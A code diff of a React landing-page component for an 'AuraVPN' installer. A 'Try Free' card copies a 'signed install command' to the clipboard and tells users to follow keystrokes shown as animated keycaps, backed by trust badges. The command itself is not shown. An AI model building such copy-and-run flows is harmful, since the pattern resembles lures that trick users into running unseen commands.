+        <p className="mt-1 text-[12px] leading-relaxed text-zinc-500">
           {step.desc}
         </p>
       </div>
 
-      <div
-        className={cn(
-          "ml-auto flex size-5 shrink-0 items-center justify-center rounded-full text-[9px] font-bold",
-          active
-            ? "bg-emerald-500/15 text-emerald-400/70"
-            : "bg-white/[0.05] text-zinc-600",
-        )}
-      >
-        {index + 1}
-      </div>
-    </div>
+      {active && (
+        <motion.span
+          aria-hidden
+          initial={{ opacity: 0, scale: 0.5 }}
+          animate={{ opacity: 1, scale: 1 }}
+          transition={{ duration: 0.22, ease: "easeOut" }}
+          className="ml-auto shrink-0 text-emerald-300/90"
+        >
+          <CheckCircle2 className="size-4" strokeWidth={2.25} />
+        </motion.span>
+      )}
+    </motion.li>
   );
 }
 
-function WinLogo({ active }: { active: boolean }) {
-  return (
-    <svg
-      viewBox="0 0 16 16"
-      className={cn(
-        "size-[14px]",
-        active ? "fill-emerald-200" : "fill-zinc-300",
-      )}
-      aria-hidden
-    >
-      <path d="M0 2.25L6.5 1.36v6.21H0V2.25zM7.25 1.26L16 0v7.57H7.25V1.26zM0 8.43h6.5v6.21L0 13.75V8.43zM7.25 8.43H16V16l-8.75-1.26V8.43z" />
-    </svg>
-  );
-}
+/* ══════════════════════════════════════════════════════════════
+   KEYCAP
+═══════════════════════════════════════════════════════════════ */
 
 function KeyCap({
   children,
-  accent,
+  pressed,
   wide,
+  accent,
 }: {
-  children: ReactNode;
-  accent?: boolean;
+  children: React.ReactNode;
+  pressed: boolean;
   wide?: boolean;
+  accent?: boolean;
 }) {
   return (
-    <kbd
-      className={cn(
-        "inline-flex select-none items-center justify-center",
-        "rounded-[9px]",
-        wide ? "h-[42px] min-w-[56px] px-3" : "size-[42px]",
-        accent
-          ? [
-              "border border-b-black/70 border-l-emerald-500/20 border-r-emerald-500/20 border-t-emerald-500/30",
-              "bg-gradient-to-b from-[oklch(0.14_0.02_156)] to-[oklch(0.10_0.015_156)]",
-              "shadow-[0_4px_0_rgb(0_0_0/0.55),0_8px_24px_rgb(16_185_129/0.12),inset_0_1px_0_rgb(16_185_129/0.25)]",
-            ].join(" ")
-          : [
-              "border border-b-black/70 border-l-white/[0.10] border-r-white/[0.10] border-t-white/[0.16]",
-              "bg-gradient-to-b from-[oklch(0.15_0_0)] to-[oklch(0.10_0_0)]",
-              "shadow-[0_4px_0_rgb(0_0_0/0.6),0_8px_20px_rgb(0_0_0/0.25),inset_0_1px_0_rgb(255_255_255/0.10)]",
-            ].join(" "),
-      )}
+    <motion.span
+      className="relative inline-flex"
+      animate={{ y: pressed ? 2 : 0 }}
+      transition={{ duration: 0.14, ease: "easeOut" }}
     >
-      {children}
-    </kbd>
+      {/* shadow depth layer */}
+      <span
+        aria-hidden
+        className={cn(
+          "absolute inset-x-0 bottom-0 rounded-[7px] transition-transform duration-100",
+          wide ? "h-7" : "size-7",
+          pressed ? "translate-y-0" : "translate-y-[2px]",
+          accent ? "bg-emerald-900/70" : "bg-black/70",
+        )}
+      />
+      <kbd
+        className={cn(
+          "relative inline-flex select-none items-center justify-center rounded-[7px] border font-mono text-[11px] font-semibold tracking-[0.04em]",
+          wide ? "h-7 min-w-[38px] px-2" : "size-7",
+          accent
+            ? [
+                "border-emerald-400/30",
+                "bg-gradient-to-b from-emerald-400/15 to-emerald-500/5 text-emerald-100",
+                pressed
+                  ? "shadow-[inset_0_1px_0_rgb(16_185_129/0.35)]"
+                  : "shadow-[inset_0_1px_0_rgb(16_185_129/0.25)]",
+              ].join(" ")
+            : [
+                "border-white/[0.1]",
+                "bg-gradient-to-b from-white/[0.06] to-white/[0.015] text-zinc-200",
+                pressed
+                  ? "shadow-[inset_0_1px_0_rgb(255_255_255/0.12)]"
+                  : "shadow-[inset_0_1px_0_rgb(255_255_255/0.08)]",
+              ].join(" "),
+        )}
+      >
+        {children}
+      </kbd>
+    </motion.span>
   );
 }
 
-/* ═══════════════════════════════════════════════════════════
-   LEFT PANEL  — preview + OS switcher
-═══════════════════════════════════════════════════════════ */
-function LeftPanel({
-  cfg,
-  meta,
-  copied,
-  platform,
-  onPick,
-}: {
-  cfg: (typeof VARIANT_CONFIG)[CtaVariant];
-  meta: PlatformMeta;
-  copied: boolean;
-  platform: Platform;
-  onPick: (p: Platform) => void;
-}) {
-  const PlatIcon = meta.Icon;
+/* ══════════════════════════════════════════════════════════════
+   MORPHING CTA — idle → copying → copied
+═══════════════════════════════════════════════════════════════ */
 
+const BURST_PARTICLES = Array.from({ length: 14 }, (_, i) => ({
+  id: i,
+  angle: (i / 14) * Math.PI * 2,
+  distance: 40 + Math.random() * 40,
+  rotate: Math.random() * 180,
+  size: 3 + Math.random() * 3,
+}));
+
+function ConfettiBurst() {
   return (
     <div
+      aria-hidden
+      className="pointer-events-none absolute left-1/2 top-1/2 -translate-x-1/2 -translate-y-1/2"
+    >
+      {BURST_PARTICLES.map((p) => (
+        <motion.span
+          key={p.id}
+          className="absolute rounded-sm bg-emerald-300"
+          style={{
+            width: p.size,
+            height: p.size,
+            left: -p.size / 2,
+            top: -p.size / 2,
+            boxShadow: "0 0 6px rgb(16 185 129 / 0.8)",
+          }}
+          initial={{ x: 0, y: 0, scale: 1, opacity: 1, rotate: 0 }}
+          animate={{
+            x: Math.cos(p.angle) * p.distance,
+            y: Math.sin(p.angle) * p.distance,
+            scale: 0,
+            opacity: 0,
+            rotate: p.rotate,
+          }}
+          transition={{ duration: 0.7, ease: [0.22, 1, 0.36, 1] }}
+        />
+      ))}
+    </div>
+  );
+}
+
+/* ══════════════════════════════════════════════════════════════
+   TRY FREE CARD — step 0 (main CTA as a step card)
+═══════════════════════════════════════════════════════════════ */
+
+function TryFreeCard({
+  state,
+  onClick,
+}: {
+  state: "idle" | "copying" | "copied";
+  onClick: () => void;
+}) {
+  const handleClick = () => {
+    if (state !== "idle") return;
+    onClick();
+  };
+
+  const isDone = state === "copied";
+  const isBusy = state === "copying";
+
+  return (
+    <motion.li
+      variants={stepVariants}
       className={cn(
-        "relative hidden flex-col justify-between overflow-hidden md:flex",
-        "w-[288px] shrink-0 rounded-l-[28px] p-7",
-        "border-r border-white/[0.05] bg-[oklch(0.045_0_0)]",
+        "relative overflow-hidden rounded-2xl border transition-colors duration-300",
+        isDone
+          ? "border-emerald-400/20 bg-emerald-400/[0.04]"
+          : "border-emerald-400/25 bg-gradient-to-br from-emerald-500/[0.08] to-emerald-500/[0.02]",
       )}
     >
-      <div
-        aria-hidden
-        className="pointer-events-none absolute -bottom-24 -left-24 h-72 w-72 rounded-full bg-emerald-500/[0.12] blur-[100px]"
-      />
-      <div
-        aria-hidden
-        className="pointer-events-none absolute -right-16 -top-16 h-56 w-56 rounded-full bg-emerald-500/[0.06] blur-[80px]"
-      />
+      {state === "copied" && <ConfettiBurst />}
+      <div className="flex items-center gap-4 px-4 py-4">
+        <span
+          aria-hidden
+          className={cn(
+            "flex size-9 shrink-0 items-center justify-center rounded-xl border text-[13px] font-semibold",
+            isDone
+              ? "border-emerald-400/40 bg-emerald-400/20 text-emerald-200"
+              : "border-emerald-400/35 bg-emerald-400/15 text-emerald-300 shadow-[0_0_18px_-4px_rgb(16_185_129/0.7)]",
+          )}
+        >
+          {isDone ? (
+            <CheckCircle2 className="size-5" strokeWidth={2.25} />
+          ) : (
+            "01"
+          )}
+        </span>
 
-      {/* TOP */}
-      <div className="relative z-10">
-        <div className="mb-5 flex items-center justify-between">
-          <span className="text-[9px] font-bold uppercase tracking-[0.24em] text-zinc-600">
-            INSTALLER
-          </span>
-          <span
+        <div className="min-w-0 flex-1">
+          <p
             className={cn(
-              "rounded-md border px-2 py-0.5 text-[9px] font-bold uppercase tracking-[0.14em]",
-              cfg.badgeCls,
+              "text-[14px] font-semibold leading-tight tracking-tight",
+              isDone ? "text-emerald-200/90" : "text-zinc-50",
             )}
           >
-            {cfg.badge}
-          </span>
+            {isDone ? "Try Free — done, command copied" : "Click Try Free"}
+          </p>
+          <p className="mt-1 text-[12px] leading-relaxed text-zinc-500">
+            {isDone
+              ? "Now follow the three keystrokes below in the Downloads window."
+              : "Copy the signed install command. No accounts needed."}
+          </p>
         </div>
 
-        {/* installer card */}
-        <div className="overflow-hidden rounded-2xl border border-white/[0.07] bg-gradient-to-b from-white/[0.03] to-transparent">
-          <div className="relative flex items-center justify-center py-8">
-            <div
-              aria-hidden
-              className="absolute inset-x-0 bottom-0 h-24 bg-gradient-to-t from-emerald-500/[0.08] to-transparent"
+        {!isDone && (
+          <MagneticButton
+            strength={30}
+            onClick={handleClick}
+            className={cn(
+              "group relative inline-flex min-w-[130px] shrink-0 items-center justify-center gap-2 overflow-hidden rounded-full px-5 py-2.5 text-[12.5px] font-semibold tracking-tight",
+              "bg-gradient-to-b from-emerald-400 to-emerald-500 text-[oklch(0.08_0_0)]",
+              "shadow-[0_0_0_1px_rgb(16_185_129/0.4),0_10px_32px_-8px_rgb(16_185_129/0.6),inset_0_1px_0_rgb(255_255_255/0.3)]",
+              "transition-[filter,box-shadow,transform] duration-200",
+              "hover:from-emerald-300 hover:to-emerald-400 hover:shadow-[0_0_0_1px_rgb(16_185_129/0.5),0_14px_44px_-6px_rgb(16_185_129/0.7)]",
+              "focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-emerald-400/70",
+              isBusy && "cursor-progress",
+            )}
+          >
+            <BorderTrail
+              size={58}
+              className="opacity-60"
+              transition={{ repeat: Infinity, duration: 4, ease: "linear" }}
             />
             <span
               aria-hidden
-              className="absolute size-[110px] animate-ping rounded-full border border-emerald-500/[0.12]"
-              style={{ animationDuration: "3.5s" }}
+              className="pointer-events-none absolute inset-0 -translate-x-full bg-gradient-to-r from-transparent via-white/25 to-transparent transition-transform duration-700 group-hover:translate-x-full"
             />
-            <span
-              aria-hidden
-              className="absolute size-[80px] animate-pulse rounded-full border border-emerald-500/[0.22]"
-              style={{ animationDuration: "2s" }}
-            />
-            <div className="relative flex size-[64px] items-center justify-center rounded-[20px] border border-emerald-500/30 bg-gradient-to-b from-emerald-500/20 to-emerald-500/8 shadow-[0_0_40px_rgb(16_185_129/0.3),0_4px_16px_rgb(0_0_0/0.4),inset_0_1px_0_rgb(16_185_129/0.4)]">
-              <PlatIcon className="size-8 text-emerald-400" strokeWidth={1.5} />
-            </div>
-          </div>
-
-          <div className="border-t border-white/[0.06] bg-black/20 px-5 py-3.5">
-            <p className="text-[9.5px] font-bold uppercase tracking-[0.22em] text-zinc-600">
-              {meta.label} · {meta.size}
-            </p>
-            <p className="mt-0.5 truncate font-mono text-[12px] font-semibold tracking-tight text-zinc-100">
-              {meta.fileName}
-            </p>
-            <div className="mt-3 h-[3px] w-full overflow-hidden rounded-full bg-white/[0.07]">
-              <span
-                aria-hidden
-                className={cn(
-                  "block h-full rounded-full",
-                  copied
-                    ? "w-full bg-emerald-400 transition-all duration-500"
-                    : "w-[55%] bg-gradient-to-r from-transparent via-emerald-400 to-transparent",
-                )}
-                style={
-                  copied
-                    ? undefined
-                    : { animation: "cta-scan 2.4s ease-in-out infinite" }
-                }
-              />
-            </div>
-            <div className="mt-1.5 flex items-center justify-between">
-              <span
-                className={cn(
-                  "font-mono text-[9px] uppercase",
-                  copied ? "text-emerald-300" : "text-zinc-700",
-                )}
+            <AnimatePresence mode="wait" initial={false}>
+              <motion.span
+                key={state}
+                initial={{ opacity: 0, y: 6 }}
+                animate={{ opacity: 1, y: 0 }}
+                exit={{ opacity: 0, y: -6 }}
+                transition={{ duration: 0.18 }}
+                className="relative flex items-center gap-1.5"
               >
-                {copied ? "COMMAND COPIED" : "READY"}
-              </span>
-              <span className="font-mono text-[9px] text-zinc-600">
-                {meta.size}
-              </span>
-            </div>
-          </div>
-        </div>
-
-        {/* OS picker */}
-        <div className="mt-3 flex items-center justify-between rounded-xl border border-white/[0.06] bg-white/[0.02] p-1">
-          {SELECTABLE.map((p) => {
-            const isActive = p === platform;
-            const P = PLATFORMS[p];
-            const Ico = P.Icon;
-            return (
-              <button
-                key={p}
-                type="button"
-                onClick={() => onPick(p)}
-                className={cn(
-                  "flex flex-1 items-center justify-center gap-1.5 rounded-lg py-2 text-[10px] font-semibold uppercase tracking-[0.1em] transition-colors",
-                  isActive
-                    ? "bg-emerald-500/15 text-emerald-300 ring-1 ring-emerald-500/25"
-                    : "text-zinc-500 hover:text-zinc-300",
+                {isBusy ? (
+                  <>
+                    <ProgressRing />
+                    <span>Copying…</span>
+                  </>
+                ) : (
+                  <>
+                    <span>Try Free</span>
+                    <ArrowRight
+                      className="size-4 transition-transform duration-200 group-hover:translate-x-0.5"
+                      strokeWidth={2.5}
+                    />
+                  </>
                 )}
-                aria-pressed={isActive}
-              >
-                <Ico className="size-3" strokeWidth={2} />
-                {P.label}
-              </button>
-            );
-          })}
-        </div>
-
-        <div className="mt-2.5 flex items-center gap-2">
-          <div className="flex items-center gap-1.5 rounded-full border border-white/[0.07] bg-white/[0.02] px-2.5 py-1">
-            <Zap className="size-2.5 text-zinc-600" strokeWidth={2} aria-hidden />
-            <span className="text-[9px] font-semibold uppercase tracking-[0.12em] text-zinc-600">
-              WireGuard
-            </span>
-          </div>
-          <div className="flex items-center gap-1.5 rounded-full border border-white/[0.07] bg-white/[0.02] px-2.5 py-1">
-            <Lock className="size-2.5 text-zinc-600" strokeWidth={2} aria-hidden />
-            <span className="text-[9px] font-semibold uppercase tracking-[0.12em] text-zinc-600">
-              No Logs
-            </span>
-          </div>
-        </div>
+              </motion.span>
+            </AnimatePresence>
+          </MagneticButton>
+        )}
       </div>
+    </motion.li>
+  );
+}
 
-      {/* BOTTOM */}
-      <div className="relative z-10">
-        <div className="flex items-center gap-1.5">
-          <span className="relative flex size-2" aria-hidden>
-            <span className="absolute inline-flex size-full animate-ping rounded-full bg-emerald-400/50" />
-            <span className="relative inline-flex size-2 rounded-full bg-emerald-400" />
-          </span>
-          <span className="text-[8.5px] font-bold uppercase tracking-[0.22em] text-emerald-400/80">
-            Signed command
-          </span>
-        </div>
-        <p className="mt-1.5 flex items-center gap-1.5 text-[13px] font-semibold text-zinc-200">
-          <ShieldCheck className="size-3.5 text-emerald-400" strokeWidth={2} aria-hidden />
-          AuraVPN Install Protocol
-        </p>
-        <p className="mt-0.5 text-[10px] text-zinc-600">
-          SHA-256 verified · Auto-update enabled
-        </p>
-      </div>
-    </div>
+function ProgressRing() {
+  return (
+    <svg
+      className="size-4 -rotate-90"
+      viewBox="0 0 16 16"
+      fill="none"
+      aria-hidden
+    >
+      <circle
+        cx="8"
+        cy="8"
+        r="6"
+        stroke="currentColor"
+        strokeOpacity="0.25"
+        strokeWidth="2"
+      />
+      <motion.circle
+        cx="8"
+        cy="8"
+        r="6"
+        stroke="currentColor"
+        strokeWidth="2"
+        strokeLinecap="round"
+        strokeDasharray={2 * Math.PI * 6}
+        initial={{ strokeDashoffset: 2 * Math.PI * 6 }}
+        animate={{ strokeDashoffset: 0 }}
+        transition={{ duration: 0.5, ease: "easeInOut" }}
+      />
+    </svg>
   );
 }
